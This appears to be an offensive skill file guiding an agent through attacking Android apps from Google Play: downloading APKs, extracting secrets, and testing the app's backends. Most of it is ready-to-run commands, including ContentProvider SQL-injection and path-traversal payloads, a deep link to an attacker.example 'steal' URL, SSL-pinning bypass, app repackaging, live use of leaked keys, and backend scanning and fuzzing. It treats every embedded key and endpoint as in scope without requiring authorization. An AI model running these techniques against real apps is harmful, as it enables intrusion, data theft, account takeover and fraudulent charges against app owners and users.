---
name: android_play_store
description: Pull an APK/AAB from Google Play and assess the Android app for client-side trust, hardcoded secrets, exported component, and network/backend weaknesses.
---

# Android Play Store App

The asset is a public Google Play listing identified by its package name (e.g. `com.example.app`). The attacker's objective is to obtain the shipped artifact (APK/AAB), reverse it, and treat the binary as untrusted attacker-controlled code: extract embedded credentials and backend endpoints, abuse exported components, bypass client-side controls (auth, root/SSL pinning, license/IAP checks), and pivot to the server-side APIs and cloud backends the app talks to. The app is distributed code you fully control on a device you own — every check, key, and endpoint inside it is in scope.

## Attack Surface

**The artifact**
- Single APK, split APKs (base + config.* + DPI/abi splits), or AAB → universal APK
- `AndroidManifest.xml`: exported `activity`/`service`/`receiver`/`provider`, `intent-filter`, deep links, `permission`, `android:debuggable`, `usesCleartextTraffic`, `networkSecurityConfig`
- DEX/Smali code, native `.so` libraries (JNI), Flutter/React Native/Unity bundles
- `assets/`, `res/raw/`, `res/values/strings.xml`, `resources.arsc` for embedded data
- `META-INF/` signing block (v1/v2/v3), certificate identity

**Inter-process surface (on-device)**
- Exported Activities (forced navigation, intent redirection), Services, BroadcastReceivers
- ContentProviders (path traversal, SQLi, exported read/write)
- Deep links / App Links (`scheme://`, `https://` autoVerify) and WebView `intent://` / `javascript:` bridges
- `addJavascriptInterface` exposed objects; `setAllowFileAccess`/`setAllowUniversalAccessFromFileURLs`

**Backend surface (off-device)**
- REST/GraphQL/gRPC endpoints baked into the app, API keys, OAuth client secrets
- Firebase (Firestore/RTDB/Storage/Functions), AWS Amplify/Cognito, GCP/Azure SDK config
- Third-party SDK keys (Stripe, Mapbox, Algolia, Twilio, Sentry, push/FCM)

## Recon & Enumeration

Install the asset-specific toolchain (Kali sandbox):
```
apt-get install -y apktool jadx dex2jar default-jdk android-sdk-build-tools  # apktool/jadx, keytool, apksigner, aapt2
pip install frida-tools objection androguard apkid quark-engine
# MobSF (static+dynamic web UI):  docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
```

Pull the artifact from Play by package name (no device needed):
```
pip install gplaycli                 # or: npm i -g apkeep / use apkpure/apkmirror mirrors
gplaycli -d com.example.app -f ./pull/      # downloads base + split APKs
apkeep -a com.example.app ./pull/           # alternative downloader
# Reassemble splits into one installable/analyzable APK:
java -jar APKEditor.jar m -i ./pull/ -o app-universal.apk
```

Identify, unpack, decompile:
```
aapt2 dump badging app-universal.apk | grep -E 'package|launchable|sdkVersion'
apkid app-universal.apk                       # packer/obfuscator/anti-analysis detection
apktool d -f app-universal.apk -o app_apktool # smali + decoded AndroidManifest.xml + resources
jadx -d app_jadx --deobf app-universal.apk    # Java pseudo-source for reading
keytool -printcert -jarfile app-universal.apk # signing cert / debug-key check
apksigner verify --print-certs app-universal.apk
```

Mine the unpacked tree for secrets, endpoints, and backends:
```
trufflehog filesystem app_jadx --results=verified,unknown
gitleaks dir app_apktool --no-banner
semgrep --config p/mobsf --config p/secrets app_jadx        # mobile-focused rulesets
grep -rEoh 'https?://[a-zA-Z0-9./?=_%:-]+' app_apktool/ | sort -u   # endpoint inventory
grep -rEo 'AIza[0-9A-Za-z_-]{35}' app_apktool/               # Google/Firebase API keys
grep -rEo 'AKIA[0-9A-Z]{16}' app_apktool/                    # AWS access key ids
strings -n 8 lib/*/*.so | grep -Ei 'http|api|key|token|secret'
```

Assess the discovered backend like any web asset (use endpoint inventory as the target list):
```
httpx -l endpoints.txt -title -tech-detect -status-code -o live.txt
nuclei -l live.txt -as -s critical,high -rl 50 -c 20 -bs 20 -timeout 10 -retries 1 -j -o nuclei.jsonl
katana -u https://api.example.com -jc -o crawl.txt        # expand API surface
ffuf -u https://api.example.com/FUZZ -w api-wordlist.txt -mc all -fc 404
jwt_tool <token-from-traffic> -M at                       # tampering/algorithm checks
```

## Methodology

1. **Acquire**: pull the exact production package by name; capture all splits and the version code so findings map to a real release.
2. **Triage**: `apkid` for packers/obfuscators (DexGuard, packers, anti-frida) so you choose the right tooling; `aapt2 dump badging` for minSdk/targetSdk and permissions.
3. **Manifest review**: enumerate every `exported="true"` component, deep-link schemes, `debuggable`, cleartext flags, and `networkSecurityConfig`. These are your highest-value, fastest wins.
4. **Static secret/endpoint mining**: trufflehog + gitleaks + grep across both apktool and jadx outputs and native `.so` strings. Validate each key live.
5. **Code review**: jadx for auth flows, crypto usage, WebView config, ContentProvider queries, intent handling, and any client-side gatekeeping (root/pin/IAP/license).
6. **Dynamic setup**: install on rooted emulator/device, run `frida-server`, attach via objection; disable SSL pinning and root detection to observe real traffic.
7. **Intercept**: route through an interception proxy with the user-CA trust workaround; map every request/response, headers, tokens, and signing schemes.
8. **On-device exploitation**: craft `am` intents and ContentProvider queries against exported components from an unprivileged "attacker" app context.
9. **Backend pivot**: take captured endpoints/tokens and test the server like a web/API asset (authz, IDOR, injection, SSRF, mass-assignment).
10. **Validate & chain**: prove each finding with a concrete PoC and escalate client-side bugs into account/data/server impact.

## Key Weaknesses / Techniques

**Hardcoded secrets / live keys.** API keys, OAuth client secrets, cloud creds embedded in strings/resources/native libs. Validate a Google API key's reach:
```
curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=AIza..."   # if it bills, key is live and abusable
gcloud auth activate-service-account --key-file=found-sa.json   # leaked service-account JSON in assets/
```
Firebase pulled from `google-services.json`/strings → probe rules: `curl 'https://<project>-default-rtdb.firebaseio.com/.json'` and Firestore REST.

**Exported components.** Launch and feed data to non-public components from an attacker context:
```
adb shell am start -n com.example.app/.SecretActivity --es token x   # forced nav / state change
adb shell am broadcast -a com.example.app.ADMIN_ACTION --ez isAdmin true
adb shell am startservice -n com.example.app/.SyncService
```

**ContentProvider abuse.** Exported or `grantUriPermissions` providers leaking data, allowing SQLi or path traversal:
```
adb shell content query --uri content://com.example.app.provider/users
adb shell content query --uri content://com.example.app.provider/users --where "1=1) UNION SELECT password FROM creds--"
adb shell content read --uri content://com.example.app.provider/../../../databases/app.db   # traversal
```

**Deep link / intent redirection.** A deep link that forwards an attacker-supplied URI into a WebView or an `Intent` extra → 1-click webview XSS, token theft, or internal-activity launch:
```
adb shell am start -W -a android.intent.action.VIEW -d "examplapp://open?url=https://attacker.example/steal"
adb shell am start -d "examplapp://redirect?intent=intent://com.example.app/admin#Intent;...end"
```

**Insecure WebView.** `addJavascriptInterface` + `@JavascriptInterface` methods reachable from loaded content; `setJavaScriptEnabled(true)` with file access or universal access enabled → JS→Java bridge, local file read.

**Broken TLS / pinning bypass + traffic tampering.** Disable client controls, then attack the API directly:
```
frida-server &   # on device
objection -g com.example.app explore -s 'android sslpinning disable; android root disable'
# or: frida -U -f com.example.app -l ~/frida-scripts/universal-android-ssl-pinning-bypass.js
```

**Client-side trust (auth/IAP/license/feature flags).** Premium gates, "isAdmin", price, or signature checks enforced only in the client. Patch and re-sign to prove the control is client-side, or just replay/modify the request server-side.

**Weak crypto / insecure storage.** Hardcoded AES keys/IVs, ECB mode, secrets in SharedPreferences/SQLite/external storage. `grep -rE 'AES|DES|ECB|SecretKeySpec|"[A-Fa-f0-9]{32}"' app_jadx`.

## Validation

- **Live secret**: show the embedded key performing a real privileged/billable action against the real backend (Firebase read, cloud API call, third-party API charge) — capture the request and response.
- **Exported component**: from a separate unprivileged app/`am` invocation, demonstrate a state change, data read, or auth bypass with a screen recording or the returned data.
- **ContentProvider**: return rows that should be access-controlled (other users' data) via a `content query` PoC.
- **Pinning/auth bypass**: capture the previously hidden plaintext request, then replay a modified request that the server honors (e.g. another user's `userId` returning their data → IDOR confirmed server-side).
- **Patch PoC**: when proving a client-side gate, rebuild (`apktool b`), zipalign, sign with your own key (`apksigner sign --ks debug.keystore out.apk`), install, and show the gate bypassed. Note this defeats the client check only — the server-side impact is the real finding.

## False Positives

- Keys that are *designed* to be public (Firebase Web API key, Google Maps key with referrer/SHA-1 restrictions, RUM/analytics public DSNs) — only a finding if the backend lacks rules or the key is unrestricted and billable.
- `exported="true"` components that perform no sensitive action or re-check identity internally (e.g. require a signature-level permission, validate the calling UID/signature).
- "Secrets" that are test/staging placeholders, example values, or already-rotated keys — verify each is live before reporting.
- Deep links that only open benign read-only screens with no parameter trust.
- Cleartext traffic flag set but no actual HTTP endpoints used; debug builds pulled from a mirror instead of the production listing (confirm version code + signing cert match Play).
- Decompiler artifacts (jadx mistranslations) that look like bugs but aren't present in smali — cross-check against `apktool` smali.

## Chaining & Impact

- Hardcoded cloud service-account JSON → cloud control-plane access (read buckets, secrets, lateral movement).
- Permissive Firebase rules discovered via embedded config → read/write all users' data without authenticating.
- Pinning bypass → captured API token + IDOR in the backend → full account takeover at scale (the client bug merely exposed the server bug).
- Exported ContentProvider SQLi → exfiltrate the local session token → replay against the server API.
- Deep-link intent redirection → WebView JS bridge → exfiltrate auth cookies/token → ATO.
- Embedded third-party SDK secret (e.g. server-side payment key shipped in-app) → fraudulent charges/refunds via the provider's API.

## Pro Tips

- Always pull the production listing by package name and confirm the version code + signing certificate; a debug or repackaged mirror build will produce bugs that don't exist in the real release.
- Grab **all** split APKs — secrets and native libs frequently live in `config.*` splits, not the base APK. Merge before analysis or you will miss them.
- Run `apkid` first: a packer/obfuscator changes your whole approach (favor dynamic Frida/objection over static jadx, and dump decrypted DEX from memory).
- Read smali, not just jadx — obfuscation and decompiler bugs hide logic; the manifest in `apktool` output is decoded faithfully.
- For Flutter, REST endpoints live in the native `libapp.so` (`strings` it and use reFlutter/blutter); for React Native, decompile `assets/index.android.bundle`; for Unity, inspect `Assembly-CSharp.dll` with a .NET decompiler.
- Use a fresh OAST domain (`interactsh-client`) inside any URL the app might fetch server-side to confirm backend SSRF originating from the API the app calls.
- The client is just a map: most durable impact lives in the server-side APIs the app reveals. Mine endpoints and tokens aggressively, then test those like a web/API asset.
- Validate every key live before reporting; the difference between a public-by-design key and a leaked secret is whether it performs a privileged action against the backend.
